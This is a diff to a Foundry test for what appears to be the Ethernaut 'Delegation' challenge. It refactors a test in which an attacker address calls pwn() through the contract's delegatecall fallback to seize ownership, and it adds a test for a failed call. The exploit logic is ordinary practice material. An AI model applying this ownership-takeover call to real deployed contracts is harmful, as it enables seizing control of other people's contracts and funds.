@@ -22,14 +22,17 @@ contract DelegationTest is Test {
         assert(delegation.owner() == owner);
     }
 
-    function test_changeOwnerDelegation() public {
-        console.log(delegation.owner());
-         
+    function test_changeOwnerDelegation() public {         
         vm.prank(attackerAddress);
-        (bool success, bytes memory data) = address(delegation).call(abi.encodeWithSignature("pwn()"));
+        (bool success ,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
         require(success, "Failed");
-        console.log(string(data));
+        assertEq(delegation.owner(), attackerAddress);
+    }
 
-        assert(delegation.owner() == attackerAddress);
+    function test_failedChangeOwnerDelegation() public {         
+        vm.prank(attackerAddress);
+        (bool success ,) = address(delegation).call(abi.encodeWithSignature("errorName()"));
+        assertEq(owner, delegation.owner());
+        assertTrue(success);
     }
 }
